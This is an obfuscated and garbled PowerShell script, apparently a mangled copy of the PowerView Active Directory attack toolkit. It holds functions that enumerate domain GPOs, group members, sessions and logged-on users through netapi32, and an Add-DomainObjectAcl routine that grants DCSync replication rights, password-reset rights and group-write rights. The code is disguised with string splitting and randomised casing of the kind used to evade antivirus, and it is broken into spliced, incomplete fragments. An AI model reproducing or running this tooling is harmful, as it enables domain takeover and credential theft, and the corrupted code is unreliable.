                                &(Z3b{3}{1}{2}{0}{4}Z3b-fS5zarninS5z,S5ze-S5z,S5zWS5z,S5zWritS5z,S5zgS5z) (S5z[GetS5z+S5z-DS5z+S5zomS5z+S5zainGPOS5z+S5z] S5z+S5zUnS5z+S5zaS5z+S5zble S5z+S5ztS5z+S5zo S5z+S5zrS5z+S5zetrieS5z+S5zve S5z+S5zdomS5z+S5zainS5z+S5z S5z+S5zsearcS5z+S5zheS5z+S5zr S5z+S5zfoS5z+S5zr S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                            }
                        }
                    }
                    elseif (YoV{IIJKdeIJKNTItyINSIJKTIJKAncE} -match S5z{.*}S5z) {
                        YoV{IDIJKEIJKNIJKTItyfILtER} += Z3b(name=YoVIdentityInstance)Z3b
                    }
                    else {
                        try {
                            YoV{guIJKIdIJKBYtIJKeSTrIJKInG} = (-Join (([Guid]YoV{IIJKdIJKENtitYiIJKNIJKStaNcE}).(Z3b{0}{2}{1}Z3b-fS5zToS5z,S5zArrayS5z,S5zByteS5z).Invoke() JGO &(Z3b{1}{2}{4}{3}{0}Z3b -f S5zectS5z,S5zFS5z,S5zorES5z,S5zch-ObjS5z,S5zaS5z) {YoV{_}.(Z3b{2}{0}{1}Z3b-fS5ziS5z,S5zngS5z,S5zToStrS5z).Invoke(S5zXS5z).(Z3b{2}{1}{0}Z3b-f S5zeftS5z,S5zLS5z,S5zPadS5z).Invoke(2,S5z0S5z)})) -Replace (Z3b{0}{1}Z3b -fS5z(.S5z,S5z.)S5z),S5z5rjYoV1S5z
                            YoV{ideNtITIJKyFIJKILIJKTer} += Z3b(objectguid=YoVGuidByteString)Z3b
                        }
                        catch {
                            YoV{IIJKDIJKENIJKTItyFiLIJKTeR} += Z3b(displayname=YoVIdentityInstance)Z3b
                        }
                    }
                }
                if (YoV{iDEntiTIJKyIJKFIJKilIJKTer} -and (YoV{IDIJKEntiTYIJKFilIJKTIJKER}.(Z3b{1}{0}Z3b -fS5zrimS5z,S5zTS5z).Invoke() -ne S5zS5z) ) {
                    YoV{FIJKilTER} += Z3b(JGOYoVIdentityFilter)Z3b
                }

                if (YoV{pIJKSBOUndpIJKArIJKAMeteIJKRS}[(Z3b{0}{1}{2}Z3b -fS5zLDS5z,S5zAPFiS5z,S5zlterS5z)]) {
                    &(Z3b{3}{2}{0}{1}Z3b -fS5zsS5z,S5zeS5z,S','Z3b-f S5zlS5z,S5zFindAlS5z).Invoke()
            YoV{resUIJKLts} JGO &(Z3b{0}{1}{2}{3}Z3b -fS5zWherS5z,S5ze-ObS5z,S5zjS5z,S5zectS5z) {YoV{_}} JGO &(Z3b{1}{2}{0}{4}{3}Z3b-f S5z-OS5z,S5zForEaS5z,S5zchS5z,S5ztS5z,S5zbjecS5z) {
                YoV{OIJKBJIJKEct} = YoV{_}.Z3bProIJKPIJKeRtiesZ3b

                if (YoV{OIJKBJEIJKCT}.Z3boIJKBjEcIJKTsIdZ3b -and YoV{OBIJKjIJKeCT}.Z3bObjECTIJKSIJKiDZ3b[0]) {','S5z+S5z S5z+S5z]
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zandS5z+S5zS5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z ','           else { YoV{REsuLIJKTs} = YoV{GPIJKosIJKEIJKArcHEr}.(Z3b{0}{1}Z3b-f S5zFindAS5z,S5zllS5z).Invoke() }
                YoV{ReSIJKUIJKlTS} JGO &(Z3b{0}{3}{1}{2}Z3b -f S5zWhere-S5z,S5zjeS5z,S5zctS5z,S5zObS5z) {YoV{_}} JGO &(Z3b{0}{3}{1}{2}{4}Z3b-f S5zForEacS5z,S5z-OS5z,S5zbjeS5z,S5zhS5z,S5zctS5z) {
                    if (YoV{pIJKsBOIJKUIJKNDParAMEIJKTeRS}[S5zRawS5z]) {
                        
                        YoV{GIJKPo} = YoV{_}
                        YoV{gIJKPo}.Z3bpIJKSObjIJKeCTZ3b.Z3btypEIJKNaIJKmESZ3b.(Z3b{1}{0}Z3b -fS5zrtS5z,S5zInseS5z).Invoke(0, (Z3b{1}{2}{3}{0}Z3b-fS5zRawS5z,S5zPS5z,S5zowerView.S5z,S5zGPO.S5z))
                    }
                    else {
                        if (YoV{PIJKSBoIJKUIJKNdPIJKArIJKAmeTERS}[(Z3b{1}{2','5zeS5z).Invoke())),
    (&(Z3b{0}{1}Z3b-f S5zfunS5z,S5zcS5z) (Z3b{0}{1}Z3b-fS5znetapiS5z,S5z32S5z) (Z3b{4}{1}{2}{3}{0}Z3b-f S5zrEnumS5z,S5ztS5z,S5zWksS5z,S5ztaUseS5z,S5zNeS5z) ([Int]) @([String], [Int],   YoV{6rK2IJK5P}.(Z3b{1}{3}{0}{2}Z3b -fS5zeByS5z,S5zMS5z,S5zRefTypeS5z,S5zakS5z).Invoke(), [Int],   ( &(Z3b{2}{1}{0}{3}Z3b-fS5ziAblS5z,S5zT-VARS5z,S5zGES5z,S5zeS5z)  (S5zr26S5z+S5z9FS5z) ).Z3bvIJKALueZ3b.(Z3b{2}{1}{0}Z3b-f S5zyRefTypeS5z,S5zBS5z,S5zMakeS5z).Invoke(),   ( &(Z3b{0}{2}{3}{1}Z3b -f S5zget-VS5z,S5zBLES5z,S5zaS5z,S5zriaS5z) (S5zrS5z+S5z269fS5z) ).Z3bvAlIJKUeZ3b.(Z3b{0}{3}{4}{2}{1}Z3b -f S5zMaS5z,S5zpeS5z,S5zRefTyS5z,S5zkS5z,S5zeByS5z).Invoke(),  YoV{rIJK26IJK9F}.(Z3b{1}{0}{2}Z3b -f S5zyRefTypS5z,S5zMakeBS5z,S5zeS5z).Invoke())),
    (&(Z3b{1}{0}Z3b-f S5zuncS5z,S5zfS5z) (Z3b{1}{0}Z3b -f S5zetapi32S5z,S5znS5z) (Z3b{3}{2}{1}{0}Z3b -f S5zmS5z,S5zssionEnuS5z,S5zetSeS5z,S5zNS5z) ([Int]) @([String], [String], [String], [Int],  ( &(Z3b{2}{0}{1}Z3b -fS5zTeS5z,S5zmS5z,S5zcHilDiS5z)  VaRiAbLE:6rK25p).Z3bVIJKALUEZ3b.(Z3b{1}{2}{0}Z3b-fS5zypeS5z,S5zMaS5z,S5zkeByRefTS5z).Invoke(), [Int],  YoV{r2IJK69F}.(Z3b{1}{0}{2}{3}Z3b-fS5zeByS5z,S5zMakS5z,S5zRS5z,S5zefTypeS5z).Invoke(),  YoV{RIJK269F}.(Z3b{1}{2}{3}{4}{0}Z3b-f S5zpeS5z,S5zMS5z,S5zaS5z,S5zkeByReS5z,S5zfTyS5z).Invoke(),  ( &(Z3b{3}{1}{2}{0}Z3b -f S5zBLES5z,S5zEt-vS5z,S5zARIaS5z,S5zgS5z)  (Z3br2Z3b+Z3b69fZ3b)  ).Z3bvAIJKLuEZ3b.(Z3b{1}{3}{0}{2}Z3b-fS5zeByRefTypS5z,S5zMaS5z,S5zeS5z,S5zkS5z).Invoke())),
    (&(Z3b{0}{1}Z3b -fS5zfunS5z,S5zcS5z) (Z3b{1}{2}{0}Z3b-f S5zi32S5z,S5znetS5z,S5zapS5z) (Z3b{0}{3}{1}{2}Z3b -fS5zNetLocalS5z,S5zoS5z,S5zupEnumS5z,S5zGrS5z) ([Int]) @([String], [Int],  YoV{6IJKRk25P}.(Z3b{0}{2}{1}{3}{4}Z3b -f S5zMaS5z,S5zeByRS5z,S5zkS5z,S5zefTS5z,S5zypeS5z).Invoke(), [Int],  YoV{R2IJK69f}.(Z3b{2}{3}{1}{0}Z3b-fS5zeS5z,S5zByRefTypS5z,S5zMS5z,S5zakeS5z).I','erS5z)]) {
            if (YoV','+S5zime.S5z+S5zTS5z+S5zoUniS5z+S5zversS5z+S5zaS5z+S5zlTimS5z+S5ze()S5z+S5z.ToString(gqMsgqM))S5z+S5zgqM
S5z+S5z S5z).Z3bRepIJKlAIJKCeZ3b(S5zK3lS5z,[sTRinG][cHar]36).Z3bRIJKEpLAceZ3b(S5zgqMS5z,[sTRinG][cHar]39)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z</Select>S5z+S5z
S5z+S5zS5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z<S5z+S5zSuppS5z+S5zrS5z+S5zess S5z+(S5zPath={S5z+S5z0}S5z+S5zSeS5z+S5zcurityS5z+S5z{S5z+S5z0}>
 S5z) -f [chAR]34+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z*S5z+S5z[
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zSystS5z+S5zem[
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S','z,S5zHosS5z,S5zNameS5z}, {Z3b{2}{0}{1}Z3b -fS5zhoS5z,S5zstnameS5z,S5zdnsS5z}, {Z3b{1}{0}Z3b -f S5zmeS5z,S5znaS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{coIJKmPIJKUTerIJKNaMe} = (Z3b{2}{0}{1}Z3b-f S5zocalhoS5z,S5zstS5z,S5zlS5z),

        ','oArguments
                            }
                            else {
                                YoV{gRIJKOupsId} = YoV{NIJKULl}
                            }
                        }
                    }

                    YoV{gIJKPoIJKgroup} = &(Z3b{0}{3}{1}{2}Z3b -fS5zNS5z,S5zecS5z,S5ztS5z,S5zew-ObjS5z) (Z3b{0}{1}Z3b-f S5zPSObS5z,S5zjectS5z)
                    YoV{gIJKPIJKogIJKROuP} JGO &(Z3b{1}{2}{0}Z3b-f S5zerS5z,S5zAdd-MeS5z,S5zmbS5z) (Z3b{0}{2}{1}Z3b -fS5zNoteS5z,S5ztyS5z,S5zproperS5z) (Z3b{2}{1}{3}{0}Z3b -f S5zyNameS5z,S5zispS5z,S5zGPODS5z,S5zlaS5z) YoV{GIJKPodISPIJKlaIJKYName}
                    YoV{GIJKPOgRIJKOUp} JGO &(Z3b{1}{0}{2}Z3b -fS5zembeS5z,S5zAdd-MS5z,S5zrS5z) (Z3b{1}{2}{0}Z3b-f S5zyS5z,S5zNoteproperS5z,S5ztS5z) (Z3b{0}{1}Z3b-f S5zGPONamS5z,S5zeS5z) YoV{GPOIJKNIJKAMe}
                    YoV{gIJKpoIJKGIJKRoUp} JGO &(Z3b{1}{0}{2}{3}Z3b -fS5zMeS5z,S5zAdd-S5z,S5zmbS5z,S5zerS5z) (Z3b{0}{1}{2}Z3b-fS5zNoteproS5z,S5zpS5z,S5zertyS5z) (Z3b{2}{0}{1}Z3b-f S5zPS5z,S5zathS5z,S5zGPOS5z) YoV{gpoIJKpath}
                    YoV{GpIJKoGIJKROup} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdd-MembS5z,S5zeS5z,S5zrS5z) (Z3b{3}{2}{1}{0}Z3b-fS5zyS5z,S5zropertS5z,S5zotepS5z,S5zNS5z) (Z3b{1}{0}{2}Z3b -f S5zTS5z,S5zGPOS5z,S5zypeS5z) (Z3b{1}{3}{2}{0}Z3b -f S5zdGroupsS5z,S5zRestriS5z,S5zteS5z,S5zcS5z)
                    YoV{gpoGIJKRIJKoup} JGO &(Z3b{0}{1}{3}{2}Z3b -f S5zAdd-MS5z,S5zeS5z,S5zerS5z,S5zmbS5z) (Z3b{3}{2}{0}{1}Z3b -f S','                    YoV{seArChERaIJKRGIJKUmIJKeNTS}[(Z3b{0}{1}Z3b-f S5zDomS5z,S5zainS5z)] = YoV{iDeNTitIJKydOIJKMaIJKin}
                        YoV{ObIJKJeCtsIJKEIJKARchIJKer} = &(Z3b{1}{4}{3}{0}{2}Z3b-fS5zSeaS5z,S5zGet-DS5z,S5zrcherS5z,S5zainS5z,S5zomS5z) @SearcherArguments
                        if (-not YoV{ObIJKJIJKEIJKcTSEarChIJKER}) {
                            &(Z3b{2}{1}{3}{0}Z3b -f S5zgS5z,S5zrniS5z,S5zWrite-WaS5z,S5znS5z) (S5z[GS5z+S5zeS5z+S5zt-DS5z+S5zoS5z+S5zmainObjeS5z+S5zct] S5z+S5zUS5z+S5znS5z+S5zable','
            YoV{AcIJKes} = @()

            if (YoV{RIJKigIJKHIJKTSGuId}) {
                YoV{gUIIJKDS} = @(YoV{RIJKiIJKgHtSGUIJKiD})
            }
            else {
                YoV{GuIIJKdS} = Switch (YoV{RiIJKgHts}) {
                    
                    (Z3b{1}{0}{3}{2}Z3b -fS5zsetPassS5z,S5zReS5z,S5zdS5z,S5zworS5z) { (Z3b{4}{1}{6}{5}{9}{0}{8}{7}{3}{2}Z3b -f S5z246d-11dS5z,S5z0299S5z,S5z9S5z,S5z52S5z,S5z0S5z,S5z0S5z,S5z57S5z,S5za768-00aa006e0S5z,S5z0-S5z,S5z-S5z) }
                    
                    (Z3b{0}{2}{1}Z3b -f S5zWritS5z,S5zbersS5z,S5zeMemS5z) { (Z3b{6}{7}{3}{5}{1}{8}{0}{4}{2}Z3b-f S5zd0-a28S5z,S5z-1S5z,S5z2S5z,S5z-0deS5z,S5z5-00aa003049eS5z,S5z6S5z,S5zbf9679cS5z,S5z0S5z,S5z1S5z) }
                    
                    
                    
                    
                    (Z3b{0}{1}Z3b -f S5zDCSyS5z,S5zncS5z) { (Z3b{8}{3}{1}{9}{5}{4}{2}{7}{10}{6}{0}Z3b-fS5z2S5z,S5z9cS5z,S5zfS5z,S5z131f6aa-S5z,S5z-S5z,S5z11d1S5z,S5zdcdS5z,S5z79fS5z,S5z1S5z,S5z07-S5z,S5z-00c04fc2S5z), (Z3b{3}{1}{2}{0}{5}{4}Z3b -fS5zad-9c07-11S5z,S5z1S5z,S5zf6S5z,S5z113S5z,S5z4fc2dcd2S5z,S5zd1-f79f-00c0S5z), (Z3b{0}{4}{1}{3}{6}{5}{2}Z3b-f S5z8S5z,S5z44S5z,S5zeda640cS5z,S5zdS5z,S5z9e95b76-4S5z,S5zfacbS5z,S5z-4c62-991a-0S5z)}
                }
            }

            ForEach (YoV{pRiIJKNCIpIJKAIJKLOBJEIJKcT} in YoV{PIJKRIJKINCIJKIPaLS}) {
                &(Z3b{0}{2}{1}Z3b-f S5zWriS5z,S5zerboseS5z,S5zte-VS5z) Z3b[Add-DomainObjectAcl] Granting principal YoV(YoVPrincipalObject.distinguishedname) S5zYoVRightsS5z on YoV(YoVTargetObject.Properties.distinguishedname) Z3b

                try {
                    YoV{IIJKdeIJKNIJKTity} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]YoV{pIJKRiNCIIJKpALoIJKBjECT}.Z3boIJKBJECtsIdZ3b)

                    if (YoV{gUIIJKDS}) {
                        ForEach (YoV{gUIJKId} in YoV{GIJKUiIJKDs}) {
                            YoV{NEIJKwgIJKUiD} = &(Z3b{2}{1}{0}{3}Z3b -fS5z-ObjeS5z,S5zwS5z,S5zNeS5z,S5zctS5z) (Z3b{0}{1}Z3b -f S5zGuS5z,S5zidS5z) YoV{gIJKUiD}
                         ','}{0}Z3b -f S5zTS5z,S5zMIS5z)         = 3
    (Z3b{1}{0}Z3b-fS5zES5z,S5zDCS5z)         = 4
}
YoV{dSdOIJKmAIJKINTrusTattRIIJKBUIJKTeS} = &(Z3b{1}{0}Z3b-f S5znumS5z,S5zpseS5z) YoV{mIJKoD} (Z3b{0}{2}{1}{3}{4}Z3b-fS5zDsDoS5z,S5zn.TrustAS5z,S5zmaiS5z,S5zttributS5z,S5zesS5z) (Z3b{1}{0}Z3b-fS5z32S5z,S5zUIntS5z) @{
    (Z3b{1}{0}{2}Z3b-fS5zRA','UMEnTs}[(Z3b{0}{1}Z3b-f S5zServeS5z,S5zrS5z)] = YoV{SErIJKVIJKEr} }
        if (YoV{pSIJKBIJKOUIJKNDpARIJKAMEIJKTErS}[(Z3b{0}{1}{2}Z3b-f S5zSearchS5z,S5zSS5z,S5zcopeS5z)]) { YoV{SEAIJKRIJKcIJKHErargUmeNtS}[(Z3b{0}{3}{2}{1}Z3b-f S5zSS5z,S5zhScopeS5z,S5zarcS5z,S5zeS5z)] = YoV{SeArIJKcHSCoIJKpE} }
        if (YoV{PsbOUNDIJKPaRIJKAmetEIJKRs}[(Z3b{2}{3}{0}{1}Z3b -f S5zltPageSS5z,S5zizeS5z,S5zRS5z,S5zesuS5z)]) { YoV{sIJKearCHERArIJKgUIJKm','nsS5z,S5zShouldS5z,S5zssForS5z,S5zroceS5z,S5zgFS5z,S5zStaS5z,S5zeChangiS5z,S5ztS5z,S5zuncS5z,S5zPS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(posItiON = 0, maNDATORY = YoV{tRIJKUE}, VALUEFrOmPIpELINe = YoV{TIJKRue}, valuEfRomPIpelINeBYPrOPERtyNAME = YoV{tRIJKUe})]
        [String[]]
        YoV{CoIJKmPuteIJKRnIJKAIJKMe},

        [Parameter(PoSitiON = 1, maNDaToRY = YoV{TrIJKUE})]
        [System.Management.Automation.ScriptBlock]
        YoV{ScriPIJKTIJKBloIJKck},

        [Parameter(POsITiOn = 2)]
        [Hashtable]
        YoV{SCrIJKIPTPaIJKRaMIJKeTErS},

        [Int]
        [ValidateRange(1,  100)]
        YoV{threIJKAIJKDs} = 20,

        [Switch]
        YoV{NOiMIJKpoIJKRtS}
    )

    BEGIN {
        
        
        YoV{SesSIIJKonIJKsTaTe} =  (&(S5zlsS5z) (S5zvAriABleS5z+S5z:S5z+S5zIKAS5z+S5zYS5z)).Z3bvAIJKlueZ3b::(Z3b{2}{1}{3}{0}Z3b -f S5zltS5z,S5zteDefaS5z,S5zCreaS5z,S5zuS5z).Invoke()

        
        
        YoV{SIJKeSSioNIJKsTIJKATe}.Z3bAparTmEntIJKSIJKTaTeZ3b =   ( &(Z3b','S5z,S5zrS5z,S5zAdd-MemS5z) (Z3b{2}{1}{0}Z3b -f S5zertyS5z,S5zotepropS5z,S5zNS5z) (Z3b{2}{0}{1}Z3b-f S5zeS5z,S5zNameS5z,S5zSourcS5z) YoV{sIJKOUIJKRceDOMIJKAIN}
                        YoV{doMIJKAINTrIJKUSt} JGO &(Z3b{1}{0}{2}Z3b -f S5zmS5z,S5zAdd-MeS5z,S5zberS5z) (Z3b{1}{2}{3}{0}Z3b-fS5ztyS5z,S5zNoS5z,S5ztepS5z,S5zroperS5z) (Z3b{1}{0}{2}Z3b-f S5zgetNamS5z,S5zTarS5z,S5zeS5z) YoV{inIJKFO}.Z3bdIJKNSdoMAIJKiNIJKNAIJKMEZ3b
                        YoV{dIJKomAINTIJKRuIJKSt} JGO &(Z3b{2}{0}{1}Z3b -f S5zdS5z,S5zd-MemberS5z,S5zAS5z) (Z3b{3}{1}{0}{2}Z3b -fS5zpertS5z,S5zoteproS5z,S5zyS5z,S5zNS5z) (Z3b{0}{3}{1}{2}Z3b-f S5zTargS5z,S5zoS5z,S5zsNameS5z,S5zetNetbiS5z) YoV{IIJKNFO}.Z3bNIJKeTBIJKiosDIJKOmAInNIJKAmeZ3b
                        YoV{DIJKoMAIJKINTRuIJKST} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdd-MemS5z,S5zbS5z,S5zerS5z) (Z3b{2}{1}{3}{0}Z3b-f S5zyS5z,S5zeS5z,S5zNotepropS5z,S5zrtS5z) (Z3b{1}{0}Z3b -f S5zagsS5z,S5zFlS5z) YoV{IIJKNFo}.Z3bfIJKlAgSZ3b
                        YoV{DomAIJKiNTRUIJKST} JGO &(Z3b{0}{1}{2}Z3b -f S5zAddS5z,S5z-S5z,S5zMemberS5z) (Z3b{2}{1}{3}{0}Z3b -fS5zpertyS5z,S5zteprS5z,S5zNoS5z,S5zoS5z) (Z3b{0}{2}{1}Z3b -f S5zParentIS5z,S5zdexS5z,S5znS5z) YoV{IIJKNfO}.Z3bPaREIJKNtIJKINdEXZ3b
                        YoV{doMIJKAINtrIJKUst} JGO &(Z3b{1}{2}{0}Z3b -fS5zberS5z,S5zAdd-S5z,S5zMemS5z) (Z3b{3}{0}{2}{1}Z3b-f S5zotS5z,S5zyS5z,S5zepropertS5z,S5zNS5z) (Z3b{0}{2}{1}Z3b -fS5zTrustTS5z,S5zpeS5z,S5zyS5z) YoV{INIJKFo}.Z3bTRIJKUsIJKTTYpeZ3b
                        YoV{dIJKoMAIJKiNtIJKRust} JGO &(Z3b{0}{2}{1}Z3b-f S5zAdS5z,S5zberS5z,S5zd-MemS5z) (Z3b{0}{1}{2}Z3b -f S5zNoS5z,S5ztep','S5z+S5zmS5z+S5zainGroupMemS5z+S5zber] S5z+S5zErS5z+S5zroS5z+S5zr S5z+S5zcS5z+S5zonverS5z+S5ztS5z+S5zing S5z+Z3bYoVMemberDNZ3b)
                                    YoV{mEIJKMbERdIJKOMAIN} = YoV{NuIJKll}
                                }
                            }
                            catch {
                                &(Z3b{2}{1}{4}{0}{3}Z3b-fS5ziS5z,S5zeS5z,S5zWritS5z,S5zngS5z,S5z-WarnS5z) (S5z[GS5z+S5zet-S5z+S5zDomainGrS5z+S5zoS5z+S5zupMS5z+S5zember]S5z+S5z S5z+S5zES5z+S5zrror S5z+S5zconveS5z+S5zrS5z+S5zting S5z+Z3bYoVMemberDNZ3b)
                                YoV{meMBERdIJKomIJKAIJKiN} = YoV{NIJKUlL}
                            }
                        }
                        else {
                            
                            YoV{MeMIJKBeIJKRdomIJKAiN} = YoV{MEMIJKBeIJKRDn}.(Z3b{2}{1}{0}Z3b-f S5zngS5z,S5zbStriS5z,S5zSuS5z).Invoke(YoV{MEMBEIJKRIJKdN}.(Z3b{0}{1}','

    Begin {
        if (YoV{PIJKRINIJKcIJKipaIJKLIDeNTITY} -notmatch (Z3b{1}{2}{0}Z3b-f S5z1-.*S5z,S5z^S5z,S5zS-S5z)) {
            YoV{PRIJKiNCIIJKpAIJKLSEIJKAIJKRCHIJKeRarguIJKMeIJKNtS} = @{
                (Z3b{1}{0}{2}Z3b -fS5zdentitS5z,S5zIS5z,S5zyS5z) = YoV{prIIJKNciPALIJKIIJKdENtIJKIIJKTy}
                (Z3b{2}{1}{0}Z3b -fS5zrtiesS5z,S5zopeS5z,S5zPrS5z) = (Z3b{5}{2}{4}{3}{1}{6}{0}Z3b -fS5zdS5z,S5zmS5z,S5znguishS5z,S5znaS5z,S5zedS5z,S5zdistiS5z,S5ze,objectsiS5z)
            }
            if (YoV{PsbOunDPaRIJKAMIJKeTIJKers}[(Z3b{1}{2}{0}Z3b-f S5zomainS5z,S5zPrS5z,S5zincipalDS5z)]) { YoV{PrIJKinCIpALSEIJKARCHErIJKArIJKgIJKUMEIJKNIJKTS}[(Z3b{0}{1}Z3b -f S5zDomaiS5z,S5znS5z)] = YoV{prINIJKCIJKIpALDOMain} }
            if (YoV{PsbOIJKUNDPIJKAIJKRAMIJKEtIJKerS}[(Z3b{1}{0}Z3b -f S5zrverS5z,S5zSeS5z)]) { YoV{PIJKRInciPAlsEAIJKRCHIJKerarGIJKUMENtS}[(Z3b{0}{1}Z3b-f S5zSS5z,S5zerverS5z)] = YoV{SEIJKRvIJKEr} }
            if (YoV{PSBIJKOIJKUnDpaRAMIJKETerS}[(Z3b{2}{0}{1}Z3b -fS5zrchScopS5z,S5zeS5z,S5zSeaS5z)]) { YoV{PIJKRIJKINIJKCipAIJKLIJKseaIJKRcHIJKERarIJKgUmEnts}[(Z3b{3}{1}{0}{2}Z3b -fS5zrchScoS5z,S5zaS5z,S5zpeS5z,S5zSeS5z)] = YoV{SeARIJKcHsCIJKoPE} }
            if (YoV{pSbOIJKUIJKNDIJKpIJKARAmETerS}[(Z3b{2}{1}{0}{4}{3}Z3b-fS5zagS5z,S5zesultPS5z,S5zRS5z,S5zSizeS5z,S5zeS5z)]) { YoV{pRIIJKNCIIJKPIJKAIJKlSIJKEaIJKRcIJKhErArIJKgumEnts}[(Z3b{3}{2}{0}{1}Z3b-f S5zeSS5z,S5zizeS5z,S5zultPagS5z,S5zResS5z)] = YoV{ReSuIJKltpIJKAGeIJKSizE} }
            if (YoV{PsBOUNIJKDpaRIJKAIJKmETeIJKRS}[(Z3b{4}{3}{0}{1}{2}Z3b-f S5ziS5z,S5zmeLS5z,S5zimitS5z,S5zverTS5z,S5zSerS5z)]) { YoV{PRinciIJKpaLsEarIJKCHEIJKRIJKARgIJKUmenTs}[(Z3b{1}{2}{3}{0}Z3b-f S5zerTimeLimitS5z,S5zSeS5z,S5zrS5z,S5zvS5z)] = YoV{SeIJKRVERTiIJKmIJKeLIIJKmIt} }
            if (YoV{PSbOUnIJKDIJKpArAmetIJKeIJKRS}[(Z3b{1}{2}{0}Z3b-f S5zbstoneS5z,S5zTS5z,S5zomS5z)]) { YoV{priNcIPIJKAlSIJKeIJKAIJKRCHerIJKAIJKRIJKGIJKUMenTS}[(Z3b{2}{0}{1}Z3b-f S5zonS5z,S5zeS5z,S5zTombstS5z)] = YoV{TOmbIJKSIJKToNE} }
            if (YoV{PsbOuIJKNdIJKPIJKAIJKRAMeTERs}[(Z3b{1}{0}{2}Z3b-f S5zntiaS5z,S5zCredeS5z,S5zlS5z)]) { YoV{PrINCIJKiIJKpalSIJKeARcHIJKeIJKRAIJKRGUIJKmeNts}[(Z3b{0}{3}{2}{1}Z3b -fS5zCreS5z,S5zlS5z,S5zaS5z,S5zdentiS5z)] = YoV{CRedIJKeIJKNtIJKIAL} }
            YoV{PIJKRiNCIIJKPaL} = &(Z3b{2}{1}{0}Z3b-f S5zinObjectS5z,S5zmaS5z,S5zGet-DoS5z) @PrincipalSearcherArguments
            if (-not YoV{prINIJKCiIJKpal}) {
                throw (S5zUnS5z+S5zabS5z+S5zle S5z+S5ztS5z+S5zo S5z+S5zreS5z+S5zsolve S5z+S5zprS5z+S5ziS5z+S5zncipalS5z+S5z: S5z+Z3bYoVPrincipalIdentityZ3b)
            }
            elseif(YoV{prIJKiNciIJKPal}.Z3bCOIJKUNtZ3b -gt 1) {
                throw (Z3b{6}{7}{11}{17}{9}{16}{0}{2}{8}{15}{4}{12}{18}{3}{20}{19}{14}{1}{13}{5}{10}Z3b-f S5zitS5z,S5zaS5z,S5zy S5z,S5zcts, S5z,S5zs mulS5z,S5zlowS5z,S5zPrS5z,S5zinS5z,S5zmatcS5z,S5zIdS5z,S5zedS5z,S5zcipS5z,S5ztiS5z,S5zlS5z,S5z is S5z,S5zheS5z,S5zentS5z,S5zalS5z,S5zple AD objeS5z,S5zonly oneS5z,S5zbut S5z)
            }
            YoV{ObIJKJIJKeCTsId} = YoV{PrIJKIIJKNcIpAl}.Z3bobjECTIJKSIdZ3b
        }
        else {
            YoV{obIJKjECTIJKsIJKId} = YoV{PrINIJKcIPalIdIJKEIJKNtiTY}
        }

        YoV{AIJKdRiIJKGHT} = 0
        foreach(YoV{R} in YoV{rIJKiIJKGHT}) {
            YoV{AdRIJKIgIJKhT} = YoV{adIJKRIJKiGHt} -bor (([System.DirectoryS','S5z,S5zfiS5z) 2 (Z3b{2}{0}{1}Z3b -f S5zt3S5z,S5z2S5z,S5zUInS5z)
    (Z3b{0}{1}Z3b-fS5zdwUsaS5z,S5zgeS5z) =         &(Z3b{1}{0}Z3b -fS5zldS5z,S5zfieS5z) 3 (Z3b{0}{1}Z3b-fS5zUInS5z,S5zt32S5z)
    (Z3b{2}{0}{1}Z3b -f S5zpLocalS5z,S5zNameS5z,S5zlS5z) =     &(Z3b{0}{1}Z3b -f S5zfiS5z,S5zeldS5z) 4 (Z3b{2}{0}{1}Z3b-f S5ztS5z,S5zringS5z,S5zSS5z) -MarshalAs @((Z3b{2}{0}{1}Z3b -f S5zWStS5z,S5zrS5z,S5zLPS5z))
    (Z3b{2}{1}{3}{0}Z3b -fS5zeS5z,S5zpRS5z,S5zlS5z,S5zemoteNamS5z) =    &(Z3b{0}{1}Z3b -fS5zfiS5z,S5zeldS5z) 5 (Z3b{0}{1}Z3b-f S5zStrinS5z,S5zgS5z) -MarshalAs @((Z3b{0}{1}{2}Z3b -f S5zLPS5z,S5zWStS5z,S5zrS5z))
    (Z3b{0}{1}Z3b-fS5zlpComS5z,S5zmentS5z) =       &(Z3b{0}{1}Z3b-fS5zfieS5z,S5zldS5z) 6 (Z3b{1}{0}Z3b-fS5zngS5z,S5zStriS5z) -MarshalAs @((Z3b{1}{0}Z3b-fS5zPWStrS5z,S5zLS5z))
    (Z3b{1}{0}{2}Z3b -f S5zrovideS5z,S5zlpPS5z,S5zrS5z) =      &(Z3b{0}{1}Z3b-fS5zfielS5z,S5zdS5z) 7 (Z3b{1}{0}Z3b-fS5ztringS5z,S5zSS5z) -MarshalAs @((Z3b{1}{2}{0}Z3b-fS5ztrS5z,S5zLPS5z,S5zWSS5z))
}


YoV{fUIJKNcTiOnDefIJKiIJKNitiONs} = @(
